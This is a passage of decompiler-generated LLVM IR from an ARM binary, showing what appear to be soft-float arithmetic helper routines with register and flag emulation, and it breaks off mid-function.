  uselistorder i32* %lr.global-to-local, { 1, 6, 2, 3, 4, 5, 0, 7 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_17f9c, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_17f64, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_17fcc() local_unnamed_addr {
dec_label_pc_17fcc:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_17fcc = load i1, i1* @cpsr_z, align 1
  %v1_17fcc = load i1, i1* @cpsr_n, align 1
  %v2_17fcc = load i1, i1* @cpsr_v, align 1
  %v3_17fcc = xor i1 %v1_17fcc, %v2_17fcc
  %v4_17fcc = or i1 %v0_17fcc, %v3_17fcc
  br i1 %v4_17fcc, label %dec_label_pc_17fd0, label %dec_label_pc_18148

dec_label_pc_17fd0:                               ; preds = %dec_label_pc_17fcc
  %v0_17fd0 = load i32, i32* @r4, align 4
  %v4_17fd0 = add i32 %v0_17fd0, 54
  %v6_17fd0 = sub i32 0, %v0_17fd0
  %v7_17fd0 = and i32 %v4_17fd0, %v6_17fd0
  %v8_17fd0 = icmp slt i32 %v7_17fd0, 0
  %v9_17fd0 = icmp slt i32 %v4_17fd0, 0
  %v10_17fd0 = icmp eq i32 %v4_17fd0, 0
  %v7_17fd4 = icmp sgt i32 %v0_17fd0, -54
  br i1 %v7_17fd4, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_17fd0
  store i32 0, i32* @r0, align 4
  %v8_17fd8 = load i32, i32* @r1, align 4
  %v9_17fd8 = and i32 %v8_17fd8, -2147483648
  store i32 %v9_17fd8, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17fd0, %bb
  %v4_17fe0 = xor i1 %v9_17fd0, %v8_17fd0
  %v5_17fe0 = or i1 %v10_17fd0, %v4_17fe0
  call void @__pseudo_cond_branch(i1 %v5_17fe0, i32 %tmp7)
  %v0_17fe4 = load i32, i32* @r4, align 4
  %v1_17fe4 = sub i32 0, %v0_17fe4
  %v2_17fe8 = sub i32 -32, %v0_17fe4
  %v4_17fe8 = add i32 %v0_17fe4, 31
  %v5_17fe8 = and i32 %v4_17fe8, %v1_17fe4
  %v6_17fe8 = icmp slt i32 %v5_17fe8, 0
  store i1 %v6_17fe8, i1* @cpsr_v, align 1
  %v6_17fec = icmp slt i32 %v1_17fe4, 32
  br i1 %v6_17fec, label %dec_label_pc_17ff0, label %dec_label_pc_1805c

dec_label_pc_17ff0:                               ; preds = %.thread1
  %v1_17ff0 = add i32 %v2_17fe8, 12
  %v8_17ff4 = icmp sgt i32 %v1_17ff0, 0
  br i1 %v8_17ff4, label %dec_label_pc_1802c, label %dec_label_pc_17ff8

dec_label_pc_17ff8:                               ; preds = %dec_label_pc_17ff0
  %v1_17ff8 = add i32 %v2_17fe8, 32
  %v1_17ffc = sub i32 0, %v2_17fe8
  %v0_18000 = load i32, i32* @r0, align 4
  %v6_18000 = shl i32 %v0_18000, %v1_17ffc
  store i32 %v6_18000, i32* @r3, align 4
  %v2_18004 = add i32 %v2_17fe8, 31
  %v3_18004 = shl i32 1, %v2_18004
  %v6_18004 = lshr i32 %v0_18000, %v1_17ff8
  %v1_18008 = load i32, i32* @r1, align 4
  %v7_18008 = shl i32 %v1_18008, %v1_17ffc
  %v8_18008 = or i32 %v7_18008, %v6_18004
  %v1_1800c = and i32 %v1_18008, -2147483648
  store i32 %v1_1800c, i32* @r2, align 4
  %tmp = bitcast i32 %v1_18008 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_18010 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_18000, 0
  %v4_18014 = zext i1 %tmp20 to i32
  %v5_18014 = add i32 %v8_18008, %v4_18014
  %v5_18018 = and i32 %v1_18010, %v3_18004
  %v6_18018 = icmp ne i32 %v5_18018, 0
  %v7_18018 = lshr i32 %v1_18010, %v1_17ff8
  %v9_18018 = add i32 %v7_18018, %v1_1800c
  %v10_18018 = zext i1 %v6_18018 to i32
  %v11_18018 = add i32 %v9_18018, %v10_18018
  store i32 %v11_18018, i32* @r1, align 4
  %v19_18018 = add i32 %v11_18018, %v10_18018
  %v20_18018 = xor i32 %v19_18018, %v1_18008
  %v21_18018 = xor i32 %v19_18018, %v7_18018
  %v22_18018 = and i32 %v20_18018, %v21_18018
  %v23_18018 = icmp slt i32 %v22_18018, 0
  store i1 %v23_18018, i1* @cpsr_v, align 1
  %v3_1801c = mul i32 %v6_18000, 2
  %v4_1801c = or i32 %v3_1801c, %tmp7
  %v5_1801c = icmp slt i32 %v4_1801c, 0
  store i1 %v5_1801c, i1* @cpsr_n, align 1
  %v6_1801c = icmp eq i32 %v4_1801c, 0
  store i1 %v6_1801c, i1* @cpsr_z, align 1
  br i1 %v6_1801c, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_17ff8
  %tmp21 = sext i1 %tmp20 to i32
  %v6_18020 = add nsw i32 %tmp21, -1
  %v7_18020 = and i32 %v5_18014, %v6_18020
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_17ff8, %bb13
  %v1_18028 = phi i32 [ %v5_18014, %dec_label_pc_17ff8 ], [ %v7_18020, %bb13 ]
  %v2_18024 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_18024, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_18028

dec_label_pc_1802c:                               ; preds = %dec_label_pc_17ff0
  %v1_1802c = sub i32 0, %v2_17fe8
  %v1_18030 = add i32 %v2_17fe8, 32
  %v0_18034 = load i32, i32* @r0, align 4
  %v6_18034 = shl i32 %v0_18034, %v1_1802c
  store i32 %v6_18034, i32* @r3, align 4
  %v6_18038 = lshr i32 %v0_18034, %v1_18030
  %v1_1803c = load i32, i32* @r1, align 4
  %v7_1803c = shl i32 %v1_1803c, %v1_1802c
  %v8_1803c = or i32 %v7_1803c, %v6_18038
  %v1_18040 = and i32 %v1_1803c, -2147483648
  %tmp22 = icmp slt i32 %v6_18034, 0
  %v4_18044 = zext i1 %tmp22 to i32
  %v5_18044 = add i32 %v8_1803c, %v4_18044
  %v6_18044 = icmp ult i32 %v5_18044, %v8_1803c
  %v2_18048 = zext i1 %v6_18044 to i32
  %v3_18048 = or i32 %v2_18048, %v1_18040
  store i32 %v3_18048, i32* @r1, align 4
  %v9_18048 = add nsw i32 %v3_18048, %v2_18048
  %v10_18048 = sub i32 0, %v1_1803c
  %v11_18048 = and i32 %v9_18048, %v10_18048
  %v12_18048 = icmp slt i32 %v11_18048, 0
  store i1 %v12_18048, i1* @cpsr_v, align 1
  %v3_1804c = mul i32 %v6_18034, 2
  %v4_1804c = or i32 %v3_1804c, %tmp7
  %v5_1804c = icmp slt i32 %v4_1804c, 0
  store i1 %v5_1804c, i1* @cpsr_n, align 1
  %v6_1804c = icmp eq i32 %v4_1804c, 0
  store i1 %v6_1804c, i1* @cpsr_z, align 1
  br i1 %v6_1804c, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1802c
  %tmp23 = sext i1 %tmp22 to i32
  %v6_18050 = add nsw i32 %tmp23, -1
  %v7_18050 = and i32 %v5_18044, %v6_18050
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1802c, %bb15
  %v1_18058 = phi i32 [ %v5_18044, %dec_label_pc_1802c ], [ %v7_18050, %bb15 ]
  %v2_18054 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_18054, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_18058

dec_label_pc_1805c:                               ; preds = %.thread1
  %v1_1805c = sub i32 32, %v2_17fe8
  %v1_18060 = load i32, i32* @r0, align 4
  %v7_18060 = shl i32 %v1_18060, %v1_1805c
  %v8_18060 = or i32 %v7_18060, %tmp7
  %v6_18064 = lshr i32 %v1_18060, %v2_17fe8
  %v1_18068 = load i32, i32* @r1, align 4
  %v7_18068 = shl i32 %v1_18068, %v1_1805c
  %v8_18068 = or i32 %v7_18068, %v6_18064
  store i32 %v8_18068, i32* @r3, align 4
  %v6_1806c = lshr i32 %v1_18068, %v2_17fe8
  %v1_18070 = and i32 %v1_18068, -2147483648
  store i32 %v1_18070, i32* @r1, align 4
  %v7_18074 = lshr i32 %v1_18070, %v2_17fe8
  %v8_18074 = sub i32 -1, %v7_18074
  %v9_18074 = and i32 %v6_1806c, %v8_18074
  %tmp24 = icmp slt i32 %v8_18068, 0
  %v4_18078 = zext i1 %tmp24 to i32
  %v5_18078 = add i32 %v4_18078, %v9_18074
  %v3_1807c = mul i32 %v8_18068, 2
  %v4_1807c = or i32 %v8_18060, %v3_1807c
  %v5_1807c = icmp slt i32 %v4_1807c, 0
  store i1 %v5_1807c, i1* @cpsr_n, align 1
  %v6_1807c = icmp eq i32 %v4_1807c, 0
  store i1 %v6_1807c, i1* @cpsr_z, align 1
  br i1 %v6_1807c, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_1805c
  %tmp25 = sext i1 %tmp24 to i32
  %v6_18080 = add nsw i32 %tmp25, -1
  %v7_18080 = and i32 %v5_18078, %v6_18080
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1805c, %bb17
  %v1_18088 = phi i32 [ %v5_18078, %dec_label_pc_1805c ], [ %v7_18080, %bb17 ]
  %v2_18084 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_18084, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_18088

dec_label_pc_18148:                               ; preds = %dec_label_pc_17fcc
  %v0_18148 = load i32, i32* @r1, align 4
  %v1_18148 = and i32 %v0_18148, -2147483648
  %v1_18150 = or i32 %v1_18148, 2146435072
  store i32 %v1_18150, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_18078, { 1, 0 }
  uselistorder i32 %v5_18044, { 1, 0, 2 }
  uselistorder i32 %v8_1803c, { 1, 0 }
  uselistorder i32 %v1_1802c, { 1, 0 }
  uselistorder i32 %v5_18014, { 1, 0 }
  uselistorder i32 %v1_18008, { 1, 0, 2, 3 }
  uselistorder i32 %v1_17ffc, { 1, 0 }
  uselistorder i32 %v2_17fe8, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_17fe4, { 1, 0 }
  uselistorder i32 %v4_17fd0, { 1, 2, 0 }
  uselistorder i32 %v0_17fd0, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 68, 69, 44, 51, 8, 52, 54, 3, 1, 2, 55, 56, 5, 0, 4, 63, 28, 10, 29, 11, 12, 53, 57, 58, 59, 60, 61, 13, 62, 50, 14, 64, 65, 9, 128, 129, 130, 131, 132, 134, 135, 133, 136, 137, 138, 139, 140, 141, 142, 15, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 16, 45, 46, 47, 48, 49, 30, 31, 17, 32, 33, 34, 39, 127, 35, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 6, 18, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 120, 113, 114, 115, 116, 117, 118, 119, 121, 122, 19, 123, 124, 7, 66, 20, 21, 22, 24, 23, 25, 83, 125, 126, 26, 38, 27, 36, 37, 40, 41, 42, 43, 67, 84 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 8, 12, 13, 0, 9, 2, 10, 1, 14 }
  uselistorder i32 54, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_18160(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_18160:
  %v1_18164 = or i32 %arg1, 2146959360
  store i32 %v1_18164, i32* @r1, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_1816c = load i32, i32* @r0, align 4
  ret i32 %v1_1816c
}

define i32 @function_18170(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_18170:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18170 = load i32, i32* @r4, align 4
  store i32 %v3_18170, i32* %stack_var_-16, align 4
  %v6_18170 = load i32, i32* @r5, align 4
  %v9_18170 = load i32, i32* @r6, align 4
  %v12_18170 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1817c = load i32, i32* @r1, align 4
  %v4_1817c = udiv i32 %v1_1817c, 1048576
  %v5_1817c = urem i32 %v4_1817c, 2048
  store i32 %v5_1817c, i32* @r4, align 4
  %v6_1817c = icmp eq i32 %v5_1817c, 0
  br i1 %v6_1817c, label %dec_label_pc_18170..thread2_crit_edge, label %bb

dec_label_pc_18170..thread2_crit_edge:            ; preds = %dec_label_pc_18170
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %dec_label_pc_18170
  %v5_18180 = udiv i32 %arg4, 1048576
  %v6_18180 = urem i32 %v5_18180, 2048
  store i32 %v6_18180, i32* %r5.global-to-local, align 4
  %v7_18180 = icmp eq i32 %v6_18180, 0
  br i1 %v7_18180, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1830c

bb90:                                             ; preds = %bb
  %v5_18184 = icmp eq i32 %v5_1817c, 2047
  br i1 %v5_18184, label %.thread2, label %bb91

.thread2:                                         ; preds = %dec_label_pc_18170..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %dec_label_pc_18170..thread2_crit_edge ], [ %v5_18180, %bb90 ]
  br label %dec_label_pc_1830c

bb91:                                             ; preds = %bb90
  %v5_18188 = icmp eq i32 %v6_18180, 2047
  br i1 %v5_18188, label %dec_label_pc_1830c, label %dec_label_pc_18190

dec_label_pc_18190:                               ; preds = %bb91
  %v2_18190 = sub nsw i32 %v5_1817c, %v6_18180
  store i32 %v2_18190, i32* %r4.global-to-local, align 4
  %v2_18194 = xor i32 %v1_1817c, %arg4
  %v4_18198 = mul i32 %arg4, 4096
  %v5_18198 = or i32 %v4_18198, %arg3
  store i32 %v5_18198, i32* %r5.global-to-local, align 4
  %v7_18198 = icmp eq i32 %v5_18198, 0
  %v3_1819c = mul i32 %v1_1817c, 4096
  store i32 %v3_1819c, i32* %r1.global-to-local, align 4
  br i1 %v7_18198, label %dec_label_pc_182d8, label %dec_label_pc_181a4

dec_label_pc_181a4:                               ; preds = %dec_label_pc_18190
  %tmp92 = mul i32 %arg4, 256
  %v4_181ac = and i32 %tmp92, 268435200
  %v4_181b0 = udiv i32 %arg3, 16777216
  %v5_181ac = or i32 %v4_181b0, %v4_181ac
  %v5_181b0 = or i32 %v5_181ac, 268435456
  store i32 %v5_181b0, i32* %r3.global-to-local, align 4
  %v3_181b4 = mul i32 %arg3, 256
  store i32 %v3_181b4, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_1817c, 256
  %v4_181b8 = and i32 %tmp93, 268435200
  %v1_181bc = load i32, i32* @r0, align 4
  %v4_181bc = udiv i32 %v1_181bc, 16777216
  %v5_181b8 = or i32 %v4_181b8, %v4_181bc
  %v5_181bc = or i32 %v5_181b8, 268435456
  store i32 %v5_181bc, i32* %r5.global-to-local, align 4
  %v3_181c0 = mul i32 %v1_181bc, 256
  store i32 %v3_181c0, i32* %r6.global-to-local, align 4
  %v1_181c4 = and i32 %v2_18194, -2147483648
  store i32 %v1_181c4, i32* %r1.global-to-local, align 4
  %v3_181c8 = icmp uge i32 %v5_181bc, %v5_181b0
  %v9_181c8 = icmp eq i32 %v5_181bc, %v5_181b0
  br i1 %v9_181c8, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_181a4
  %v4_181cc = icmp uge i32 %v3_181c0, %v3_181b4
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_181a4, %bb94
  %v1_181d0 = phi i1 [ %v3_181c8, %dec_label_pc_181a4 ], [ %v4_181cc, %bb94 ]
  %v2_181d0 = add nsw i32 %v2_18190, 253
  %v3_181d0 = zext i1 %v1_181d0 to i32
  %v4_181d0 = add nsw i32 %v2_181d0, %v3_181d0
  %v8_181d0 = icmp ule i32 %v4_181d0, %v2_18190
  %v9_181d0 = icmp ugt i32 %v2_18190, -254
  %v10_181d0 = select i1 %v1_181d0, i1 %v8_181d0, i1 %v9_181d0
  %v1_181d4 = add nsw i32 %v4_181d0, 768
  store i32 %v1_181d4, i32* %r4.global-to-local, align 4
  br i1 %v10_181d0, label %dec_label_pc_181e4, label %dec_label_pc_181dc

dec_label_pc_181dc:                               ; preds = %bb95
  %v3_181dc = udiv i32 %v5_181b0, 2
  store i32 %v3_181dc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_181e4

dec_label_pc_181e4:                               ; preds = %bb95, %dec_label_pc_181dc
  %v0_181ec = phi i32 [ %v5_181b0, %bb95 ], [ %v3_181dc, %dec_label_pc_181dc ]
  %v0_181f0 = phi i32 [ %v3_181b4, %bb95 ], [ 0, %dec_label_pc_181dc ]
  %v2_181e4 = sub i32 %v3_181c0, %v0_181f0
  store i32 %v2_181e4, i32* %r6.global-to-local, align 4
  %v3_181e4 = icmp uge i32 %v3_181c0, %v0_181f0
  %v3_181e8 = icmp eq i1 %v3_181e4, false
  %v4_181e8 = sub nsw i32 %v5_181bc, %v0_181ec
  %v6_181e8 = sext i1 %v3_181e8 to i32
  %v7_181e8 = add nsw i32 %v6_181e8, %v4_181e8
  store i32 %v7_181e8, i32* %r5.global-to-local, align 4
  %v3_181ec = udiv i32 %v0_181ec, 2
  store i32 %v3_181ec, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_181fc.outer

dec_label_pc_181fc.outer:                         ; preds = %dec_label_pc_18294, %dec_label_pc_181e4
  %v1_182a8.ph = phi i32 [ %v2_18294, %dec_label_pc_18294 ], [ %v1_181c4, %dec_label_pc_181e4 ]
  %v0_18200.ph = phi i32 [ %v5_18270, %dec_label_pc_18294 ], [ %v7_181e8, %dec_label_pc_181e4 ]
  %v1_18204.ph = phi i32 [ %v3_18274, %dec_label_pc_18294 ], [ %v2_181e4, %dec_label_pc_181e4 ]
  %v5_1827c17.ph = phi i32 [ %v5_1827c, %dec_label_pc_18294 ], [ %v3_181ec, %dec_label_pc_181e4 ]
  %v3_1828013.ph = phi i32 [ %v3_18280, %dec_label_pc_18294 ], [ 0, %dec_label_pc_181e4 ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_18294 ], [ 1048576, %dec_label_pc_181e4 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_18294 ], [ 524288, %dec_label_pc_181e4 ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_181fc

dec_label_pc_181fc:                               ; preds = %dec_label_pc_181fc.outer, %dec_label_pc_1826c
  %v1_1826059 = phi i32 [ %v2_182a8, %dec_label_pc_1826c ], [ %storemerge133, %dec_label_pc_181fc.outer ]
  %v1_1820c = phi i32 [ %v1_1820c32, %dec_label_pc_1826c ], [ %storemerge133, %dec_label_pc_181fc.outer ]
  %v1_1822841 = phi i32 [ %v1_1822843, %dec_label_pc_1826c ], [ %storemerge133, %dec_label_pc_181fc.outer ]
  %v1_1824450 = phi i32 [ %v1_1824452, %dec_label_pc_1826c ], [ %storemerge133, %dec_label_pc_181fc.outer ]
  %v0_18284 = phi i32 [ %v3_18284, %dec_label_pc_1826c ], [ %storemerge, %dec_label_pc_181fc.outer ]
  %v0_18200 = phi i32 [ %v5_18270, %dec_label_pc_1826c ], [ %v0_18200.ph, %dec_label_pc_181fc.outer ]
  %v1_18204 = phi i32 [ %v3_18274, %dec_label_pc_1826c ], [ %v1_18204.ph, %dec_label_pc_181fc.outer ]
  %v5_1827c17 = phi i32 [ %v5_1827c, %dec_label_pc_1826c ], [ %v5_1827c17.ph, %dec_label_pc_181fc.outer ]
  %v3_1828013 = phi i32 [ %v3_18280, %dec_label_pc_1826c ], [ %v3_1828013.ph, %dec_label_pc_181fc.outer ]
  %v3_181fc = icmp uge i32 %v1_18204, %v3_1828013
  %v3_18200 = icmp eq i1 %v3_181fc, false
  %v4_18200 = sub i32 %v0_18200, %v5_1827c17
  %v6_18200 = sext i1 %v3_18200 to i32
  %v7_18200 = add i32 %v6_18200, %v4_18200
  %v8_18200 = zext i1 %v3_18200 to i32
  %v9_18200 = sub i32 %v7_18200, %v8_18200
  %v10_18200 = icmp ult i32 %v0_18200, %v9_18200
  %v11_18200 = icmp ne i32 %v5_1827c17, -1
  %v12_18200 = or i1 %v11_18200, %v10_18200
  %v13_18200 = icmp ult i32 %v0_18200, %v5_1827c17
  %v14_18200 = select i1 %v3_18200, i1 %v12_18200, i1 %v13_18200
  br i1 %v14_18200, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_181fc
  %v3_18204 = sub i32 %v1_18204, %v3_1828013
  store i32 %v3_18204, i32* %r6.global-to-local, align 4
  store i32 %v7_18200, i32* %r5.global-to-local, align 4
  %v3_1820c = or i32 %v1_1820c, %v0_18284
  store i32 %v3_1820c, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_181fc, %bb96
  %v1_1826058 = phi i32 [ %v1_1826059, %dec_label_pc_181fc ], [ %v3_1820c, %bb96 ]
  %v1_1820c35 = phi i32 [ %v1_1820c, %dec_label_pc_181fc ], [ %v3_1820c, %bb96 ]
  %v1_18228 = phi i32 [ %v1_1822841, %dec_label_pc_181fc ], [ %v3_1820c, %bb96 ]
  %v1_1824449 = phi i32 [ %v1_1824450, %dec_label_pc_181fc ], [ %v3_1820c, %bb96 ]
  %v0_1821c = phi i32 [ %v0_18200, %dec_label_pc_181fc ], [ %v7_18200, %bb96 ]
  %v1_18220 = phi i32 [ %v1_18204, %dec_label_pc_181fc ], [ %v3_18204, %bb96 ]
  %v1_18210 = urem i32 %v5_1827c17, 2
  %v2_18210 = icmp ne i32 %v1_18210, 0
  %v3_18210 = udiv i32 %v5_1827c17, 2
  %v3_18214 = zext i1 %v2_18210 to i32
  %v6_18214 = zext i32 %v3_1828013 to i64
  %v7_18214 = sub i32 33, %v3_1828013
  %v8_18214 = zext i32 %v7_18214 to i64
  %v9_18214 = shl i64 %v6_18214, %v8_18214
  %v10_18214 = sub i32 32, %v3_1828013
  %v11_18214 = shl i32 %v3_18214, %v10_18214
  %v12_18214 = zext i32 %v11_18214 to i64
  %v14_18214 = or i64 %v12_18214, %v9_18214
  %v15_18214 = trunc i64 %v14_18214 to i32
  %v3_18218 = icmp uge i32 %v1_18220, %v15_18214
  %v3_1821c = icmp eq i1 %v3_18218, false
  %v4_1821c = sub i32 %v0_1821c, %v3_18210
  %v6_1821c = sext i1 %v3_1821c to i32
  %v7_1821c = add i32 %v6_1821c, %v4_1821c
  %v13_1821c = icmp ult i32 %v0_1821c, %v3_18210
  %v14_1821c = or i1 %v13_1821c, %v3_1821c
  br i1 %v14_1821c, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_18220 = sub i32 %v1_18220, %v15_18214
  store i32 %v3_18220, i32* %r6.global-to-local, align 4
  store i32 %v7_1821c, i32* %r5.global-to-local, align 4
  %v5_18228 = udiv i32 %v0_18284, 2
  %v6_18228 = or i32 %v1_18228, %v5_18228
  store i32 %v6_18228, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_1826057 = phi i32 [ %v1_1826058, %.thread4 ], [ %v6_18228, %bb97 ]
  %v1_1820c34 = phi i32 [ %v1_1820c35, %.thread4 ], [ %v6_18228, %bb97 ]
  %v1_1822845 = phi i32 [ %v1_18228, %.thread4 ], [ %v6_18228, %bb97 ]
  %v1_18244 = phi i32 [ %v1_1824449, %.thread4 ], [ %v6_18228, %bb97 ]
  %v0_18238 = phi i32 [ %v0_1821c, %.thread4 ], [ %v7_1821c, %bb97 ]
  %v1_1823c = phi i32 [ %v1_18220, %.thread4 ], [ %v3_18220, %bb97 ]
  %v1_1822c = urem i32 %v3_18210, 2
  %v2_1822c = icmp ne i32 %v1_1822c, 0
  %v3_1822c = udiv i32 %v5_1827c17, 4
  %v3_18230 = zext i1 %v2_1822c to i32
  %v6_18230 = and i64 %v14_18214, 4294967295
  %v7_18230 = sub i32 33, %v15_18214
  %v8_18230 = zext i32 %v7_18230 to i64
  %v9_18230 = shl i64 %v6_18230, %v8_18230
  %v10_18230 = sub i32 32, %v15_18214
  %v11_18230 = shl i32 %v3_18230, %v10_18230
  %v12_18230 = zext i32 %v11_18230 to i64
  %v14_18230 = or i64 %v12_18230, %v9_18230
  %v15_18230 = trunc i64 %v14_18230 to i32
  %v3_18234 = icmp uge i32 %v1_1823c, %v15_18230
  %v3_18238 = icmp eq i1 %v3_18234, false
  %v4_18238 = sub i32 %v0_18238, %v3_1822c
  %v6_18238 = sext i1 %v3_18238 to i32
  %v7_18238 = add i32 %v6_18238, %v4_18238
  %v13_18238 = icmp ult i32 %v0_18238, %v3_1822c
  %v14_18238 = or i1 %v13_18238, %v3_18238
  br i1 %v14_18238, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_1823c = sub i32 %v1_1823c, %v15_18230
  store i32 %v3_1823c, i32* %r6.global-to-local, align 4
  store i32 %v7_18238, i32* %r5.global-to-local, align 4
  %v5_18244 = udiv i32 %v0_18284, 4
  %v6_18244 = or i32 %v1_18244, %v5_18244
  store i32 %v6_18244, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_18260 = phi i32 [ %v1_1826057, %.thread6 ], [ %v6_18244, %bb98 ]
  %v1_1820c33 = phi i32 [ %v1_1820c34, %.thread6 ], [ %v6_18244, %bb98 ]
  %v1_1822844 = phi i32 [ %v1_1822845, %.thread6 ], [ %v6_18244, %bb98 ]
  %v1_1824453 = phi i32 [ %v1_18244, %.thread6 ], [ %v6_18244, %bb98 ]
  %v0_18254 = phi i32 [ %v0_18238, %.thread6 ], [ %v7_18238, %bb98 ]
  %v1_18258 = phi i32 [ %v1_1823c, %.thread6 ], [ %v3_1823c, %bb98 ]
  %v1_18248 = urem i32 %v3_1822c, 2
  %v2_18248 = icmp ne i32 %v1_18248, 0
  %v3_18248 = udiv i32 %v5_1827c17, 8
  %v3_1824c = zext i1 %v2_18248 to i32
  %v6_1824c = and i64 %v14_18230, 4294967295
  %v7_1824c = sub i32 33, %v15_18230
  %v8_1824c = zext i32 %v7_1824c to i64
  %v9_1824c = shl i64 %v6_1824c, %v8_1824c
  %v10_1824c = sub i32 32, %v15_18230
  %v11_1824c = shl i32 %v3_1824c, %v10_1824c
  %v12_1824c = zext i32 %v11_1824c to i64
  %v14_1824c = or i64 %v12_1824c, %v9_1824c
  %v15_1824c = trunc i64 %v14_1824c to i32
  %v3_18250 = icmp uge i32 %v1_18258, %v15_1824c
  %v3_18254 = icmp eq i1 %v3_18250, false
  %v4_18254 = sub i32 %v0_18254, %v3_18248
  %v6_18254 = sext i1 %v3_18254 to i32
  %v7_18254 = add i32 %v6_18254, %v4_18254
  %v13_18254 = icmp ult i32 %v0_18254, %v3_18248
  %v14_18254 = or i1 %v13_18254, %v3_18254
  br i1 %v14_18254, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_18258 = sub i32 %v1_18258, %v15_1824c
  store i32 %v3_18258, i32* %r6.global-to-local, align 4
  store i32 %v7_18254, i32* %r5.global-to-local, align 4
  %v5_18260 = udiv i32 %v0_18284, 8
  %v6_18260 = or i32 %v1_18260, %v5_18260
  store i32 %v6_18260, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_18270 = phi i32 [ %v1_18258, %.thread8 ], [ %v3_18258, %bb100 ]
  %v0_1826c = phi i32 [ %v0_18254, %.thread8 ], [ %v7_18254, %bb100 ]
  %v2_182a8 = phi i32 [ %v1_18260, %.thread8 ], [ %v6_18260, %bb100 ]
  %v1_1820c32 = phi i32 [ %v1_1820c33, %.thread8 ], [ %v6_18260, %bb100 ]
  %v1_1822843 = phi i32 [ %v1_1822844, %.thread8 ], [ %v6_18260, %bb100 ]
